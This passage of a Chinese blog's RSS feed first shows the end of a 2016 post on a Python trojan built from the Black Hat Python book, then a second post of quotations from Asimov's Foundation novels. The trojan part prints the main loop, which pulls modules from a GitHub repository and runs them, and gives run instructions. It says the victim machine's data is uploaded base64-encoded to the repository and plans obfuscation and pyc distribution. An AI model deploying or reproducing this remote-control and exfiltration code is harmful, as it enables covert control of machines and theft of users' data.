
    &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# store the result in our repo&lt;/span&gt;
    &lt;span class="n"&gt;store_module_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt;


&lt;span class="c1"&gt;# main trojan loop&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;meta_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;GitImporter&lt;/span&gt;&lt;span class="p"&gt;()]&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;

        &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_trojan_config&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;module_runner&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],))&lt;/span&gt;
            &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;相关模块说明&lt;/h3&gt;
&lt;h5&gt;&lt;a href="https://github.com/sigmavirus24/github3.py"&gt;github3.py&lt;/a&gt;&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Python library for interfacing with the GitHub APIv3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5&gt;&lt;a href="https://docs.python.org/2/library/imp.html"&gt;imp&lt;/a&gt;&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Access the import internals&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;运行&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#fork https://github.com/wwj718/blackhatpythonbook&lt;/span&gt;
git clone https://github.com/USERNAME/blackhatpythonbook
&lt;span class="nb"&gt;cd&lt;/span&gt; blackhatpythonbook
mv local.yaml.template local.yaml
&lt;span class="c1"&gt;#填入你的github的用户名和密码&lt;/span&gt;
pip install github3.py
python git_trojan.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后你的本机数据将每隔一段时间上传到data/abc目录中，值得注意的是，数据经过base64编码&lt;/p&gt;
&lt;p&gt;你也可以在modules目录下新建功能脚本，脚本将被定期拉到client执行，这样一来你可以以插件的形式来添加task&lt;/p&gt;
&lt;h1&gt;想象空间&lt;/h1&gt;
&lt;p&gt;我们发现一个有趣的现象，那些叫做软件的代码，通常拥有充足的资源和权限，用户尽力满足配合软件的种种需求，饶是如此，它们还常常莫名其妙地奔溃，而另一类被称作病毒的代码，时刻被限制和提防，饶是如此，它们依然能在各种复杂的环境下健壮地运行。&lt;/p&gt;
&lt;p&gt;在某种意义上，计算机科学由黑客（hacker）驱动着&lt;/p&gt;
&lt;p&gt;我们实际上可以将以上代码看做一种热更新机制，我们可以用它来升级已分发的程序，不需要重启就能升级软件，看上去如同生物一般生长&lt;/p&gt;
&lt;h1&gt;github Webhooks &amp;amp; services&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Webhooks allow external services to be notified when certain events happen within your repository. When the specified events happen, we’ll send a POST request to each of the URLs you provide&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用github提供的webhook功能，我们可以进行时间通知&lt;/p&gt;
&lt;h3&gt;热加载&lt;/h3&gt;
&lt;p&gt;热加载是我前段时间感兴趣的一个话题，最初源于和@xudong的讨论，有空再写这部分 &lt;/p&gt;
&lt;h1&gt;建议&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;用小号测试&lt;/li&gt;
&lt;li&gt;不要做坏事哦&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;接下来干啥&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;代码混淆&lt;/li&gt;
&lt;li&gt;分发pyc&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;h3&gt;pyinstaller&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;pyinstaller --onefile git_trojan.py 能能通过&lt;/li&gt;
&lt;li&gt;pyinstaller 编译python2脚本时Queue会找不到， 使用2to3转为python3编译，会进进下一个问题&lt;/li&gt;
&lt;li&gt;github3.py引用的requests会报错，编码问题（python2和3都存在）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;编码问题&lt;/h3&gt;
&lt;p&gt;2to3 -w git_trojan.py,之后用python3执行，报错：&lt;code&gt;LookupError: unknown encoding: idna&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;资源&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/blackhatpythonbook"&gt;blackhatpythonbook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 13 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-13:use-python-and-github-create-Trojan-Horse.html</guid><category>dev-tools</category></item><item><title>基地</title><link>/The-Foundation-Series.html</link><description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;摘自阿西莫夫《基地》&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;***&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;武力是无能者最后的手段&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是让我再说一遍给你听，也许你还不了解事情的关键。当时谁都忍不住会想到的办法，就是集结所有的力量与敌人作殊死战。这是最简单的方法，也是满足自尊心的最佳方法——但是，也必然是最愚笨的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我不认为这两件事可以相提并论——糖尿病患可以用胰岛素治好，根本不用开刀，但盲肠炎却一定需要动手术，这是谁都无法改变的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;四王国每年都选派最优秀的人，来端点星接受教士养成教育，成绩最佳的则留在这里继续深造。假如你以为那些学成归国的教士——他们不但连一点科学基础都没有，更糟的是，所学到的还是刻意扭曲的知识，居然能够渗透核能工程、电子学和超曲速的理论，果真如此，那你对于科学的看法就太浪漫、太愚蠢了。想要达到这种境界，必须接受一辈子的训练，还要再加上一副聪明的脑袋才行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;做事光明磊落总是有好处的，尤其是对那些以卖弄玄虚著称的人而言&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;像他这种所谓虔诚的人，都有一个共同的特点——为了自己的目的，他可以不眨眼地割断别人的喉咙，但是他却不敢危害不切实际、虚无缥缈的灵魂。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;假如我能把力场式削铅笔刀卖给一个贵族，他就会试图修改法律，让他自己能够合法使用。说得更露骨一点，也许你会认为很蠢，但在心理学上这是很正当的，那就是只要在战略性的地点，实施战略性的销售，就能在宫廷里建立起拥核的派系&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;欧南·巴尔是一个老人，已经老得无所畏惧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当哈里·谢顿为我们规划未来的历史轨迹时，并没有考虑到什么显赫的英雄豪杰、名将良相，他所计算的是经济与社会的历史巨流。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果根本没有什么迫在眉睫的危险，人民的爱国心就不会被激发出来，这样，那些小小的不便，反而会令人感到难以忍受。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史上，每一个独裁专制的统治者，都喜欢以人民的福祉，换取他们心目中的光荣与武功。然而对于广大的民众，与他们有切身关系的只是那些小东西&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;它可以预测群众对于某些刺激的反应，其精确度绝不逊于物理学对于台球反弹轨迹的预测，但其博大精深犹有过之。虽然直到目前为止，还没有数学能够预测个人的任何行为，然而对于数十亿人口的集体反应，心理史学却能精确地掌握其中的动向。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你把整个事件当成学术研究对象，放在显微镜底下不慌不忙地仔细观察。可是那里有我的朋友，他们已经处在生死关头，那里的整个世界，我的故乡，也快要被毁灭了。你是一个局外人，你当然不明白&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;川陀不只是一个行星，更是银河帝国二十万星系的心脏。它唯一的功能就是行政管理，唯一的目的就是统治帝国，唯一的产物就是法律条文。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你们所做的这些尝试，就像是以人力在水面拍击出来的涟漪，对于巨浪没有一点影响。谢顿的巨浪依然继续向前推进，虽然悄无声息，却是无坚不摧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果历史定律产生误差的机率较大，那只是因为历史研究的对象——人，数目并没有物理学中的原子那么多&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对他而言，矫揉做作地喜好各种规矩就是“有系统”，孜孜不倦、兴致勃勃地处理鸡毛蒜皮的公事就是“勤勉”；对于该做的事情优柔寡断就是“谨慎”；对于错误盲目地、固执地坚持到底就是“决心”。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;市长无论如何也是人民选出来的，不满意的话随时可以叫他们滚蛋。他还常常强调，一生下来就能继承的东西其实只有一样，那就是先天性的白痴&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他不可避免地问了一句：“这到底是怎么回事？” 自从人类出现以来，在无数个类似如今的场合，这一句问话——一字不差——曾经从各式各样的人口中吐出来过。可是从来没有任何记载显示，这句问话除了显现威风之外，还能有什么其他的目的或用途。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你的意思是说签了一张卖身契？跟一个女人？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有过半数的出色演奏家，在其他方面简直就是白痴。心理学之所以这么有意思，就是因为这种古怪的现象还真不少。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他顿了顿，微笑了一下，然后再以亲切和蔼的口气说：“对了，如果有人站着的话，可以坐下了，如果有谁想抽烟也请便吧。我的肉身根本不在这里，大家不必拘泥于形式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这个世界叫做新川陀！也就是新的川陀！当人们叫出这个名称之后，就已经把它与原先那个伟大的川陀之间的类似之处全都说完了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他有办法调整人类的情感平衡，这听来像是一个小把戏，事实上却具有天下无敌的威力&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;谢顿曾经做过哪些假设？第一，在未来的一千年间人类社会没有任何基本上的变化。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;现在，父亲一定准备发表长篇大论，告诫她什么是年轻女子不应当做的事。看来，好像根本没有什么是她们应当做的，也许只有上吊自杀是唯一的例外。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;然而这种方法却极为笨拙，而且表达能力明显不足，只能将心灵中细腻的思想，转换成发声器官所发出的迟钝声音&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;追根究底，一直向深层探索下去，我们就能够发现，人类蒙受的一切苦难，都可以追溯到一个事实——那就是在银河的历史上，几乎没有任何人能够了解他人的心思&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;偶尔，从某团迷雾会透出一丝微弱模糊的讯号，而人类就是借着这些讯号互相摸索。然而，由于相互之间无法了解，也就不能彼此互信互谅，所以每个人从幼年时代开始，始终处于一种绝对孤寂的状态，时时刻刻都会感到恐惧不安。长此以往，便导致了人与人之间的猜忌与迫害。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人类对于自身以及社会的控制，凭借的只是随机的摸索，或者是以灵感、直觉、情感为基础的伦理体系。结果，在人类过去的历史中，从未出现过稳定度大于百分之五十五的文明&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;心理史学定律本质上是统计性的，如果个人的反应并非是随机的，那么心理史学就会失效&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;勉强可以算是远亲——就好像摩天大楼跟小茅屋也扯得上关系一样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;达瑞尔博士发现，当他那个疯狂的女儿有小命不保之虞时，银河的命运似乎变得一点都不重要了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她想学卡通人物那样，将眼睛突出门外、让头留在舱内，不过没办到；她的头不由自主地跟着眼睛一起伸了出去。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;侯密尔听了她的这些高论，忍不住开怀大笑。他觉得很奇怪——她这些古怪的观点，究竟是从哪一本精彩的历史小说中看来的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;能跟一个真正有智慧的人交谈，而且对方又认真地聆听你的高谈阔论，实在是人生一大乐事&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;事实上，她也一直有一个梦想，希望将来有朝一日，自己也能成为这样一个倾国倾城的尤物，只可惜基地如今不流行这一套&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;由于某个或数个如今已无人知晓的原因，银河标准时间的基本单位——“秒”，被定义为光线行进二十九万九千七百九十二点四五八公里所需的时间。以此为基准，再将八万六千四百秒定为一个银河标准日，三百六十五个标准日定为一个银河标准年&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对我们而言，生命是一连串的偶然，随时随地都要随机应变。可是对于他们那些人，生命中任何事件都有既定的目的，而且一切都要按照既有的计划逐步执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们很可能比你更了解你的心意。假如说，他们真的对你了若指掌，或许就会故意要你表现出自以为——自以为极不可能的反应，因为他们能预知你的推理与思维方式...不论我多么深入这个循环，结果也只有去、留两种选择&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这实在简单得令人忍不住生气&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;哈里·谢顿将川陀称作‘群星的尽头’，”他又细声说道，“为何不能是个诗意的意象呢？宇宙一度完全受到这个星体支配；所有的恒星都曾经跟此处保持联系；古谚有云，‘条条大路通川陀’——这里才是群星真正的尽头。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只要民众深信不疑，自然就会依据这个信念行动。许多预言最后终于成真，唯一的凭借只是信心的力量，这就是所谓的‘自我实现的预言’&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不是每个人都能令民众同样信服，丹莫茨尔。然而，数学家却能用数学公式和术语来支持他的预言。即使谁也不了解他说些什么，大家仍会深信不疑&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于那些将哈里·谢顿视为传奇性半人半神的后人而言，谢顿此刻的形象——没有满头白发、没有布满皱纹的老脸、没有放射智慧光芒的微笑、没有坐在轮椅上——似乎是一种亵渎&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;每个成功的政治人物、商人，或是从事任何行业的人，都必须能够对未来做出估计，而且估计得相当准，否则他们不会成功&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;难道你看不出来吗？这就是你的用处。你根本不需要预测未来，只要选择一个未来——一个好的未来、一个有用的未来。然后做出一种预测，让所有人类的情绪和反应发生变化，以便实现你预测的那个未来。与其预测一个坏的未来，不如制造一个好的未来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;假如他成功了，有办法预测未来，不论是多么朦胧模糊，也等于掌握了极大的权力。即使他自己不希望拥有权力——我总认为如此自制的人少之又少，他也可能会被别人利用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;皇帝一直遭到囚禁，不论他自已是否承认这一点。那可能是全银河最豪华的一座牢狱，但却无法改变牢狱的事实&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;因为他很关心自己在历史上的地位，这是没什么成就的老人常有的心态&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;反重力太空飞行，然而那需要很多的技术性突破；据我所知，大多数物理学家坚决相信绝无可能——话说回来，当初，他们大多认为连重力升降机都绝无可能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“我只答应试试看。”谢顿一面说，一而想道：就像是答应试着用沙土搓出一条绳子。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在这段期间，他们将内心的愤恨发泄殆尽，沉溺于年轻革命家的一切自大自满，等他们在帝国体制中谋得一官半职后，就很容易变得既温顺又服从&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;政府为了这许多原因，总是谨慎地保持每所大学的自由。这根本不是他们有什么雅量，只能算是精明罢了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“你有一种虐待狂的幽默感。” “你要剥夺我的乐趣吗？”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;假如你想决定一个物体如何落下。你不必关心它是新还是旧，是红还是绿，或者是否具有某种气味。忽略掉这些性质，你就避免了不必要的复杂。你可将这种简化称为模型或仿真，可以把它实际展现在电脑屏幕上，或是以数学关系式描述&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;相信某些实体独立于自然律之外，比如说不受能量守恒或作用量常数存在的限制&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在自然物质世界中拥有较少本钱的成员，比较容易在你所谓的超自然论中找到慰藉。例如穷人、出身卑微者，以及遭受压迫的人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“多可怕啊。”铎丝说，“你把人类看成简单的机械装置——只要按下这个钮，就得到那种反应。” “并非如此，因为许多钮会依不同程度同时被按下，许许多多相异的反应将因而引发，以致对未来的整体预测必将是统计性的，所以独立个体仍是自由因子。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;举例而言，成功的宗教有积聚财富的倾向，到头来可能扭曲一个社会的经济发展。顺便提一下，这是人类历史的无数法则之一，你的人性学基本定律——无论你管它叫什么——必须能把它导出来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;吃到一个非常特殊的口味，令你终身难忘，但是机会就只那么一次。我九岁的时候吃过一个——”她的兴奋表情突然消失无踪，“这是一件好事，让你体味到世事无常。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在每个世界上，最早期的历史都是一堆大杂烩，充满了说教式的英雄事迹与迷你剧本，只可视为一种道德剧，不能太过当真&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;任何遭禁的事物都会产生性吸引力。如果你生活在一个妇女随时袒胸的社会，你会不会对女性的乳房特别感兴趣&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;狄罗德行星曾有过一段时期，未婚性行为是绝对自由的，未婚者可拥有多个性伴侣，公开性行为只有在阻碍交通时才会引起反感。然而一旦结婚之后，双方就会绝对遵守一夫一妻制。他们的理论是先让一个人实现所有的幻想，这个人就能定下心来面对严肃的生活&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在数学中，我们一天到晚在说‘假设’，看看是否会导致什么明显的错误，或是自相矛盾的结果&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;为何那么多人过着庸庸碌碌的日子，从未试图找出许多问题的答案，甚至根本未曾想到那些问题？人生难道还有什么事情，比寻找答案更令人感到振奋&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;统治阶级力行禁欲生活的少之又少，只有在公开场合例外。把这点记在你的笔记簿上，作为心理史学的金科玉律之一&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;无论如何，我所做过的一切，或是可能做的任何事，都没有严重到需要以皇位作为惩罚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;过去也一定曾有一段时期，在核心自然定律发现之前，物理学似乎只是一堆毫无关联的观察结果&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“太糟了’这句话嘴巴说说倒很容易。你说你不敢苟同，这样你就能成为一个好人，然后你就可以管你自己的事，再也不用关心这个问题。这要比‘太糟了’还要糟许多倍，它抵触了所有高尚、自然的事物&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;外围世界的微小影响可在事后再加进来，作为一种二阶修正&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;情感，亲爱的谢顿，是人类行动的一个强大动力，远比人类自已所了解的更为强大。你无法明白轻轻一碰能达到多大效果，以及我多不情愿这样做&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不论你是什么，你还是铎丝&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
